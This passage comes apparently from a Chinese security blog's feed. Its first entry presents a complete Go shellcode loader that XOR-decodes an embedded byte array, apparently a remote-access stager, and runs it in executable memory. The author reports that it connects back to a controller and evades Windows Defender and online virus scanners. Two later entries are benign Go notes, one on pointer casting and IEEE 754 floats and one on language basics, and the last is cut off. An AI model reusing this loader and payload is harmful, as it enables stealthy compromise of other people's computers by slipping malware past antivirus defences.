class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x41</span>, <span class="number">0x58</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xf2</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xc9</span>, <span class="number">0x41</span>, </span><br><span class="line"><span class="number">0xba</span>, <span class="number">0x58</span>, <span class="number">0xa4</span>, <span class="number">0x53</span>, <span class="number">0xe5</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xc3</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0xc7</span>, <span class="number">0x4d</span>, <span class="number">0x31</span>, </span><br><span class="line"><span class="number">0xc9</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0xf0</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xda</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xf9</span>, <span class="number">0x41</span>, <span class="number">0xba</span>, <span class="number">0x02</span>, <span class="number">0xd9</span>, <span class="number">0xc8</span>, </span><br><span class="line"><span class="number">0x5f</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0x83</span>, <span class="number">0xf8</span>, <span class="number">0x00</span>, <span class="number">0x7d</span>, <span class="number">0x28</span>, <span class="number">0x58</span>, <span class="number">0x41</span>, <span class="number">0x57</span>, <span class="number">0x59</span>, <span class="number">0x68</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, </span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x41</span>, <span class="number">0x58</span>, <span class="number">0x6a</span>, <span class="number">0x00</span>, <span class="number">0x5a</span>, <span class="number">0x41</span>, <span class="number">0xba</span>, <span class="number">0x0b</span>, <span class="number">0x2f</span>, <span class="number">0x0f</span>, <span class="number">0x30</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, </span><br><span class="line"><span class="number">0x57</span>, <span class="number">0x59</span>, <span class="number">0x41</span>, <span class="number">0xba</span>, <span class="number">0x75</span>, <span class="number">0x6e</span>, <span class="number">0x4d</span>, <span class="number">0x61</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0x49</span>, <span class="number">0xff</span>, <span class="number">0xce</span>, <span class="number">0xe9</span>, <span class="number">0x3c</span>, </span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0x48</span>, <span class="number">0x01</span>, <span class="number">0xc3</span>, <span class="number">0x48</span>, <span class="number">0x29</span>, <span class="number">0xc6</span>, <span class="number">0x48</span>, <span class="number">0x85</span>, <span class="number">0xf6</span>, <span class="number">0x75</span>, <span class="number">0xb4</span>, <span class="number">0x41</span>, </span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xe7</span>, <span class="number">0x58</span>, <span class="number">0x6a</span>, <span class="number">0x00</span>, <span class="number">0x59</span>, <span class="number">0x49</span>, <span class="number">0xc7</span>, <span class="number">0xc2</span>, <span class="number">0xf0</span>, <span class="number">0xb5</span>, <span class="number">0xa2</span>, <span class="number">0x56</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>,}</span><br><span class="line">fmt.Print(<span class="string">"{"</span>)</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(shellcode); i++ {</span><br><span class="line">fmt.Print(shellcode[i]^KEY_1^KEY_2, <span class="string">","</span>)</span><br><span class="line">}</span><br><span class="line">fmt.Print(<span class="string">"}"</span>)</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>加载<code>shellcode</code><br></p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"syscall"</span></span><br><span class="line"><span class="string">"unsafe"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">MEM_COMMIT             = <span class="number">0x1000</span></span><br><span class="line">MEM_RESERVE            = <span class="number">0x2000</span></span><br><span class="line">PAGE_EXECUTE_READWRITE = <span class="number">0x40</span> <span class="comment">// 区域可以执行代码，应用程序可以读写该区域。</span></span><br><span class="line">KEY_1                  = <span class="number">55</span></span><br><span class="line">KEY_2                  = <span class="number">66</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">kernel32      = syscall.MustLoadDLL(<span class="string">"kernel32.dll"</span>)</span><br><span class="line">ntdll         = syscall.MustLoadDLL(<span class="string">"ntdll.dll"</span>)</span><br><span class="line">VirtualAlloc  = kernel32.MustFindProc(<span class="string">"VirtualAlloc"</span>)</span><br><span class="line">RtlCopyMemory = ntdll.MustFindProc(<span class="string">"RtlCopyMemory"</span>)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> {</span><br><span class="line">xor_shellcode := []<span class="keyword">byte</span>{<span class="number">0x89</span>, <span class="number">0x3d</span>, <span class="number">0xf6</span>, <span class="number">0x91</span>, <span class="number">0x85</span>, <span class="number">0x9d</span>, <span class="number">0xb9</span>, <span class="number">0x75</span>, <span class="number">0x75</span>, <span class="number">0x75</span>, <span class="number">0x34</span>, <span class="number">0x24</span>, <span class="number">0x34</span>, <span class="number">0x25</span>, <span class="number">0x27</span>, <span class="number">0x24</span>, <span class="number">0x23</span>, <span class="number">0x3d</span>, <span class="number">0x44</span>, <span class="number">0xa7</span>, <span class="number">0x10</span>, <span class="number">0x3d</span>, <span class="number">0xfe</span>, <span class="number">0x27</span>, <span class="number">0x15</span>, <span class="number">0x3d</span>, <span class="number">0xfe</span>, <span class="number">0x27</span>, <span class="number">0x6d</span>, <span class="number">0x3d</span>, <span class="number">0xfe</span>, <span class="number">0x27</span>, <span class="number">0x55</span>, <span class="number">0x3d</span>, <span class="number">0xfe</span>, <span class="number">0x7</span>, <span class="number">0x25</span>, <span class="number">0x3d</span>, <span class="number">0x7a</span>, <span class="number">0xc2</span>, <span class="number">0x3f</span>, <span class="number">0x3f</span>, <span class="number">0x38</span>, <span class="number">0x44</span>, <span class="number">0xbc</span>, <span class="number">0x3d</span>, <span class="number">0x44</span>, <span class="number">0xb5</span>, <span class="number">0xd9</span>, <span class="number">0x49</span>, <span class="number">0x14</span>, <span class="number">0x9</span>, <span class="number">0x77</span>, <span class="number">0x59</span>, <span class="number">0x55</span>, <span class="number">0x34</span>, <span class="number">0xb4</span>, <span class="number">0xbc</span>, <span class="number">0x78</span>, <span class="number">0x34</span>, <span class="number">0x74</span>, <span class="number">0xb4</span>, <span class="number">0x97</span>, <span class="number">0x98</span>, <span class="number">0x27</span>, <span class="number">0x34</span>, <span class="number">0x24</span>, <span class="number">0x3d</span>, <span class="number">0xfe</span>, <span class="number">0x27</span>, <span class="number">0x55</span>, <span class="number">0xfe</span>, <span class="number">0x37</span>, <span class="number">0x49</span>, <span class="number">0x3d</span>, <span class="number">0x74</span>, <span class="number">0xa5</span>, <span class="number">0x13</span>, <span class="number">0xf4</span>, <span class="number">0xd</span>, <span class="number">0x6d</span>, <span class="number">0x7e</span>, <span class="number">0x77</span>, <span class="number">0x7a</span>, <span class="number">0xf0</span>, <span class="number">0x7</span>, <span class="number">0x75</span>, <span class="number">0x75</span>, <span class="number">0x75</span>, <span class="number">0xfe</span>, <span class="number">0xf5</span>, <span class="number">0xfd</span>, <span class="number">0x75</span>, <span class="number">0x75</span>, <span class="number">0x75</span>, <span class="number">0x3d</span>, <span class="number">0xf0</span>, <span class="number">0xb5</span>, <span class="number">0x1</span>, <span class="number">0x12</span>, <span class="number">0x3d</span>, <span class="number">0x74</span>, <span class="number">0xa5</span>, <span class="number">0x25</span>, <span class="number">0xfe</span>, <span class="number">0x3d</span>, <span class="number">0x6d</span>, <span class="number">0x31</span>, <span class="number">0xfe</span>, <span class="number">0x35</span>, <span class="number">0x55</span>, <span class="number">0x3c</span>, <span class="number">0x74</span>, <span class="number">0xa5</span>, <span class="number">0x96</span>, <span class="number">0x23</span>, <span class="number">0x3d</span>, <span class="number">0x8a</span>, <span class="number">0xbc</span>, <span class="number">0x34</span>, <span class="number">0xfe</span>, <span class="number">0x41</span>, <span class="number">0xfd</span>, <span class="number">0x3d</span>, <span class="number">0x74</span>, <span class="number">0xa3</span>, <span class="number">0x38</span>, <span class="number">0x44</span>, <span class="number">0xbc</span>, <span class="number">0x3d</span>, <span class="number">0x44</span>, <span class="number">0xb5</span>, <span class="number">0xd9</span>, <span class="number">0x34</span>, <span class="number">0xb4</span>, <span class="number">0xbc</span>, <span class="number">0x78</span>, <span class="number">0x34</span>, <span class="number">0x74</span>, <span class="number">0xb4</span>, <span class="number">0x4d</span>, <span class="number">0x95</span>, <span class="number">0x0</span>, <span class="number">0x84</span>, <span class="number">0x39</span>, <span class="number">0x76</span>, <span class="number">0x39</span>, <span class="number">0x51</span>, <span class="number">0x7d</span>, <span class="number">0x30</span>, <span class="number">0x4c</span>, <span class="number">0xa4</span>, <span class="number">0x0</span>, <span class="number">0xad</span>, <span class="number">0x2d</span>, <span class="number">0x31</span>, <span class="number">0xfe</span>, <span class="number">0x35</span>, <span class="number">0x51</span>, <span class="number">0x3c</span>, <span class="number">0x74</span>, <span class="number">0xa5</span>, <span class="number">0x13</span>, <span class="number">0x34</span>, <span class="number">0xfe</span>, <span class="number">0x79</span>, <span class="number">0x3d</span>, <span class="number">0x31</span>, <span class="number">0xfe</span>, <span class="number">0x35</span>, <span class="number">0x69</span>, <span class="number">0x3c</span>, <span class="number">0x74</span>, <span class="number">0xa5</span>, <span class="number">0x34</span>, <span class="number">0xfe</span>, <span class="number">0x71</span>, <span class="number">0xfd</span>, <span class="number">0x3d</span>, <span class="number">0x74</span>, <span class="number">0xa5</span>, <span class="number">0x34</span>, <span class="number">0x2d</span>, <span class="number">0x34</span>, <span class="number">0x2d</span>, <span class="number">0x2b</span>, <span class="number">0x2c</span>, <span class="number">0x2f</span>, <span class="number">0x34</span>, <span class="number">0x2d</span>, <span class="number">0x34</span>, <span class="number">0x2c</span>, <span class="number">0x34</span>, <span class="number">0x2f</span>, <span class="number">0x3d</span>, <span class="number">0xf6</span>, <span class="number">0x99</span>, <span class="number">0x55</span>, <span class="number">0x34</span>, <span class="number">0x27</span>, <span class="number">0x8a</span>, <span class="number">0x95</span>, <span class="number">0x2d</span>, <span class="number">0x34</span>, <span class="number">0x2c</span>, <span class="number">0x2f</span>, <span class="number">0x3d</span>, <span class="number">0xfe</span>, <span class="number">0x67</span>, <span class="number">0x9c</span>, <span class="number">0x3e</span>, <span class="number">0x8a</span>, <span class="number">0x8a</span>, <span class="number">0x8a</span>, <span class="number">0x28</span>, <span class="number">0x3c</span>, <span class="number">0xcb</span>, <span class="number">0x2</span>, <span class="number">0x6</span>, <span class="number">0x47</span>, <span class="number">0x2a</span>, <span class="number">0x46</span>, <span class="number">0x47</span>, <span class="number">0x75</span>, <span class="number">0x75</span>, <span class="number">0x34</span>, <span class="number">0x23</span>, <span class="number">0x3c</span>, <span class="number">0xfc</span>, <span class="number">0x93</span>, <span class="number">0x3d</span>, <span class="number">0xf4</span>, <span class="number">0x99</span>, <span class="number">0xd5</span>, <span class="number">0x74</span>, <span class="number">0x75</span>, <span class="number">0x75</span>, <span class="number">0x3c</span>, <span class="number">0xfc</span>, <span class="number">0x90</span>, <span class="number">0x3c</span>, <span class="number">0xc9</span>, <span class="number">0x77</span>, <span class="number">0x75</span>, <span class="number">0x71</span>, <span class="number">0xa7</span>, <span class="number">0xb5</span>, <span class="number">0xdd</span>, <span class="number">0xf8</span>, <span class="number">0xfd</span>, <span class="number">0x34</span>, <span class="number">0x21</span>, <span class="number">0x3c</span>, <span class="number">0xfc</span>, <span class="number">0x91</span>, <span class="number">0x39</span>, <span class="number">0xfc</span>, <span class="number">0x84</span>, <span class="number">0x34</span>, <span class="number">0xcf</span>, <span class="number">0x39</span>, <span class="number">0x2</span>, <span class="number">0x53</span>, <span class="number">0x72</span>, <span class="number">0x8a</span>, <span class="number">0xa0</span>, <span class="number">0x39</span>, <span class="number">0xfc</span>, <span class="number">0x9f</span>, <span class="number">0x1d</span>, <span class="number">0x74</span>, <span class="number">0x74</span>, <span class="number">0x75</span>, <span class="number">0x75</span>, <span class="number">0x2c</span>, <span class="number">0x34</span>, <span class="number">0xcf</span>, <span class="number">0x5c</span>, <span class="number">0xf5</span>, <span class="number">0x1e</span>, <span class="number">0x75</span>, <span class="number">0x8a</span>, <span class="number">0xa0</span>, <span class="number">0x1f</span>, <span class="number">0x7f</span>, <span class="number">0x34</span>, <span class="number">0x2b</span>, <span class="number">0x25</span>, <span class="number">0x25</span>, <span class="number">0x38</span>, <span class="number">0x44</span>, <span class="number">0xbc</span>, <span class="number">0x38</span>, <span class="number">0x44</span>, <span class="number">0xb5</span>, <span class="number">0x3d</span>, <span class="number">0x8a</span>, <span class="number">0xb5</span>, <span class="number">0x3d</span>, <span class="number">0xfc</span>, <span class="number">0xb7</span>, <span class="number">0x3d</span>, <span class="number">0x8a</span>, <span class="number">0xb5</span>, <span class="number">0x3d</span>, <span class="number">0xfc</span>, <span class="number">0xb4</span>, <span class="number">0x34</span>, <span class="number">0xcf</span>, <span class="number">0x9f</span>, <span class="number">0x7a</span>, <span class="number">0xaa</span>, <span class="number">0x95</span>, <span class="number">0x8a</span>, <span class="number">0xa0</span>, <span class="number">0x3d</span>, <span class="number">0xfc</span>, <span class="number">0xb2</span>, <span class="number">0x1f</span>, <span class="number">0x65</span>, <span class="number">0x34</span>, <span class="number">0x2d</span>, <span class="number">0x39</span>, <span class="number">0xfc</span>, <span class="number">0x97</span>, <span class="number">0x3d</span>, <span class="number">0xfc</span>, <span class="number">0x8c</span>, <span class="number">0x34</span>, <span class="number">0xcf</span>, <span class="number">0xec</span>, <span class="number">0xd0</span>, <span class="number">0x1</span>, <span class="number">0x14</span>, <span class="number">0x8a</span>, <span class="number">0xa0</span>, <span class="number">0xf0</span>, <span class="number">0xb5</span>, <span class="number">0x1</span>, <span class="number">0x7f</span>, <span class="number">0x3c</span>, <span class="number">0x8a</span>, <span class="number">0xbb</span>, <span class="number">0x0</span>, <span class="number">0x90</span>, <span class="number">0x9d</span>, <span class="number">0xe6</span>, <span class="number">0x75</span>, <span class="number">0x75</span>, <span class="number">0x75</span>, <span class="number">0x3d</span>, <span class="number">0xf6</span>, <span class="number">0x99</span>, <span class="number">0x65</span>, <span class="number">0x3d</span>, <span class="number">0xfc</span>, <span class="number">0x97</span>, <span class="number">0x38</span>, <span class="number">0x44</span>, <span class="number">0xbc</span>, <span class="number">0x1f</span>, <span class="number">0x71</span>, <span class="number">0x34</span>, <span class="number">0x2d</span>, <span class="number">0x3d</span>, <span class="number">0xfc</span>, <span class="number">0x8c</span>, <span class="number">0x34</span>, <span class="number">0xcf</span>, <span class="number">0x77</span>, <span class="number">0xac</span>, <span class="number">0xbd</span>, <span class="number">0x2a</span>, <span class="number">0x8a</span>, <span class="number">0xa0</span>, <span class="number">0xf6</span>, <span class="number">0x8d</span>, <span class="number">0x75</span>, <span class="number">0xb</span>, <span class="number">0x20</span>, <span class="number">0x3d</span>, <span class="number">0xf6</span>, <span class="number">0xb1</span>, <span class="number">0x55</span>, <span class="number">0x2b</span>, <span class="number">0xfc</span>, <span class="number">0x83</span>, <span class="number">0x1f</span>, <span class="number">0x35</span>, <span class="number">0x34</span>, <span class="number">0x2c</span>, <span class="number">0x1d</span>, <span class="number">0x75</span>, <span class="number">0x65</span>, <span class="number">0x75</span>, <span class="number">0x75</span>, <span class="number">0x34</span>, <span class="number">0x2d</span>, <span class="number">0x3d</span>, <span class="number">0xfc</span>, <span class="number">0x87</span>, <span class="number">0x3d</span>, <span class="number">0x44</span>, <span class="number">0xbc</span>, <span class="number">0x34</span>, <span class="number">0xcf</span>, <span class="number">0x2d</span>, <span class="number">0xd1</span>, <span class="number">0x26</span>, <span class="number">0x90</span>, <span class="number">0x8a</span>, <span class="number">0xa0</span>, <span class="number">0x3d</span>, <span class="number">0xfc</span>, <span class="number">0xb6</span>, <span class="number">0x3c</span>, <span class="number">0xfc</span>, <span class="number">0xb2</span>, <span class="number">0x38</span>, <span class="number">0x44</span>, <span class="number">0xbc</span>, <span class="number">0x3c</span>, <span class="number">0xfc</span>, <span class="number">0x85</span>, <span class="number">0x3d</span>, <span class="number">0xfc</span>, <span class="number">0xaf</span>, <span class="number">0x3d</span>, <span class="number">0xfc</span>, <span class="number">0x8c</span>, <span class="number">0x34</span>, <span class="number">0xcf</span>, <span class="number">0x77</span>, <span class="number">0xac</span>, <span class="number">0xbd</span>, <span class="number">0x2a</span>, <span class="number">0x8a</span>, <span class="number">0xa0</span>, <span class="number">0xf6</span>, <span class="number">0x8d</span>, <span class="number">0x75</span>, <span class="number">0x8</span>, <span class="number">0x5d</span>, <span class="number">0x2d</span>, <span class="number">0x34</span>, <span class="number">0x22</span>, <span class="number">0x2c</span>, <span class="number">0x1d</span>, <span class="number">0x75</span>, <span class="number">0x35</span>, <span class="number">0x75</span>, <span class="number">0x75</span>, <span class="number">0x34</span>, <span class="number">0x2d</span>, <span class="number">0x1f</span>, <span class="number">0x75</span>, <span class="number">0x2f</span>, <span class="number">0x34</span>, <span class="number">0xcf</span>, <span class="number">0x7e</span>, <span class="number">0x5a</span>, <span class="number">0x7a</span>, <span class="number">0x45</span>, <span class="number">0x8a</span>, <span class="number">0xa0</span>, <span class="number">0x22</span>, <span class="number">0x2c</span>, <span class="number">0x34</span>, <span class="number">0xcf</span>, <span class="number">0x0</span>, <span class="number">0x1b</span>, <span class="number">0x38</span>, <span class="number">0x14</span>, <span class="number">0x8a</span>, <span class="number">0xa0</span>, <span class="number">0x3c</span>, <span class="number">0x8a</span>, <span class="number">0xbb</span>, <span class="number">0x9c</span>, <span class="number">0x49</span>, <span class="number">0x8a</span>, <span class="number">0x8a</span>, <span class="number">0x8a</span>, <span class="number">0x3d</span>, <span class="number">0x74</span>, <span class="number">0xb6</span>, <span class="number">0x3d</span>, <span class="number">0x5c</span>, <span class="number">0xb3</span>, <span class="number">0x3d</span>, <span class="number">0xf0</span>, <span class="number">0x83</span>, <span class="number">0x0</span>, <span class="number">0xc1</span>, <span class="number">0x34</span>, <span class="number">0x8a</span>, <span class="number">0x92</span>, <span class="number">0x2d</span>, <span class="number">0x1f</span>, <span class="number">0x75</span>, <span class="number">0x2c</span>, <span class="number">0x3c</span>, <span class="number">0xb2</span>, <span class="number">0xb7</span>, <span class="number">0x85</span>, <span class="number">0xc0</span>, <span class="number">0xd7</span>, <span class="number">0x23</span>, <span class="number">0x8a</span>, <span class="number">0xa0</span>}</span><br><span class="line"><span class="keyword">var</span> shellcode []<span class="keyword">byte</span></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(xor_shellcode); i++ {</span><br><span class="line">shellcode = <span class="built_in">append</span>(shellcode, xor_shellcode[i]^KEY_1^KEY_2)</span><br><span class="line">}</span><br><span class="line">addr, _, err := VirtualAlloc.Call(<span class="number">0</span>, <span class="keyword">uintptr</span>(<span class="built_in">len</span>(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &amp;&amp; err.Error() != <span class="string">"The operation completed successfully."</span> {</span><br><span class="line">syscall.Exit(<span class="number">0</span>)</span><br><span class="line">}</span><br><span class="line">_, _, err = RtlCopyMemory.Call(addr, (<span class="keyword">uintptr</span>)(unsafe.Pointer(&amp;shellcode[<span class="number">0</span>])), <span class="keyword">uintptr</span>(<span class="built_in">len</span>(shellcode)))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &amp;&amp; err != <span class="literal">nil</span> &amp;&amp; err.Error() != <span class="string">"The operation completed successfully."</span> {</span><br><span class="line">syscall.Exit(<span class="number">0</span>)</span><br><span class="line">}</span><br><span class="line">syscall.Syscall(addr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>然后<code>go build</code>就可以了，用upx压缩一下体积也不是很大</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20191220094240-0280b88c-22ca-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>可以正常上线：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20191220095000-087600b6-22cb-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>查杀一下<br></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20191220094615-82b02394-22ca-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p></p><p><code>Windows Defender</code></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20191221234713-281c459e-2409-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p><code>virscan</code>的<a href="http://r.virscan.org/language/zh-cn/report/9c50256a567b0fcbec0f9a6ab7bad0ba" target="_blank" rel="noopener">扫描结果</a></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20191220094724-abce80cc-22ca-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>说明golang加载<code>shellcode</code>免杀效果还是不错的，而且体积也没有<code>python</code>的大，后期还是有很大的挖掘空间的</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> golang </tag>
            
            <tag> pentest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>golang指针类型转换上遇到的一些问题</title>
      <link href="/2019/12/19/golang%E6%8C%87%E9%92%88%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2%E4%B8%8A%E9%81%87%E5%88%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98/"/>
      <url>/2019/12/19/golang%E6%8C%87%E9%92%88%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2%E4%B8%8A%E9%81%87%E5%88%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>今天在<code>golang</code>指针类型转换上遇到的一些问题，这里记录一下，代码如下</p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line"><span class="string">"unsafe"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> {</span><br><span class="line"><span class="keyword">var</span> f <span class="keyword">float32</span></span><br><span class="line">f = <span class="number">3.0</span></span><br><span class="line"><span class="keyword">var</span> a <span class="keyword">int</span></span><br><span class="line">a = *(*<span class="keyword">int</span>)((unsafe.Pointer(&amp;f)))</span><br><span class="line">fmt.Println((*<span class="keyword">int</span>)((unsafe.Pointer(&amp;f))))</span><br><span class="line">fmt.Println(&amp;f)</span><br><span class="line">fmt.Println(a)</span><br><span class="line">fmt.Println(<span class="keyword">int</span>(f))</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这个代码的意思是将浮点指针类型转换为整数的指针类型，运行之后输出的结果是：<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0xc0000120a0</span><br><span class="line">0xc0000120a0</span><br><span class="line">1077936128</span><br><span class="line">3</span><br></pre></td></tr></tbody></table></figure><p></p><p>这里就没想明白了，明明地址都相同，但是为什么输出的结果确截然不同呢。</p><p>经过一番思考之后，猜测应该是直接把内存中存储的浮点数转换为了整型，浮点数在内存是遵循<code>IEEE 754</code>标准的</p><p>任何浮点数都可以这么表示：<code>float = (-1) ^ S * M * 2 ^ E</code></p><p><code>Sign (1bit)</code>：表示浮点数是正数还是负数。0表示正数，1表示负数<br><code>Exponent (8bits)</code>：指数部分。以2为底的科学计数法。<br><code>Mantissa (23bits)</code>：基数部分。浮点数具体数值的实际表示。</p><p>我们上面<code>f</code>是单精度(float32)，占用4个字节，共32位大小，表示为：1位符号，8位指数，23位小数。</p><p>我们现在来把上面的<code>3.0</code>转化为内存中存储形式<br>3.0转化为二进制为11.0，然后用以2为底的科学计数法表示：1.10*2^1。然后是整数符号位S为<code>0</code>；指数部分为1，然后再加上<code>127</code>变为<code>128</code>，因为计数中指数是可以为负的，所以规定在存入E时，在它原本的值上加上中间数（127），在使用时减去中间数（127）；基数部分为10，然后在后面再填充21个0补全23位。最终为：S+E+M，即：<code>0 10000000 10000000000000000000000</code>，转化为10进制为：<code>1077936128</code>，刚好对应了上面的结果。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> golang </tag>
            
            <tag> problem solving </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Golang学习笔记</title>
      <link href="/2019/11/15/Golang%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2019/11/15/Golang%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="Golang学习笔记"><a href="#Golang学习笔记" class="headerlink" title="Golang学习笔记"></a>Golang学习笔记</h2><p>你的 Go 安装目录<code>（$GOROOT）</code>的文件夹结构应该如下所示：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/bin：包含可执行文件，如：编译器，Go 工具</span><br><span class="line">/doc：包含示例程序，代码工具，本地文档等</span><br><span class="line">/lib：包含文档模版</span><br><span class="line">/misc：包含与支持 Go 编辑器有关的配置文件以及 cgo 的示例</span><br><span class="line">/os_arch：包含标准库的包的对象文件（.a）</span><br><span class="line">/src：包含源代码构建脚本和标准库的包的完整源代码（Go 是一门开源语言）</span><br><span class="line">/src/cmd：包含 Go 和 C 的编译器和命令行脚本</span><br></pre></td></tr></tbody></table></figure><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">这些浮点数类型的取值范围可以从很微小到很巨大。浮点数取值范围的极限值可以在 math 包中找到：</span><br><span class="line">常量 math.MaxFloat32 表示 float32 能取到的最大数值，大约是 3.4e38；</span><br><span class="line">常量 math.MaxFloat64 表示 float64 能取到的最大数值，大约是 1.8e308；</span><br><span class="line">float32 和 float64 能表示的最小值分别为 1.4e-45 和 4.9e-324。</span><br><span class="line">一个 float32 类型的浮点数可以提供大约 6 个十进制数的精度，而 float64 则可以提供约 15 个十进制数的精度，通常应该优先使用 float64 类型，因为 float32 类型的累计计算误差很容易扩散，并且 float32 能精确表示的正整数并不是很大。</span><br></pre></td></tr></tbody></table></figure><h3 id="变量"><a href="#变量" class="headerlink" 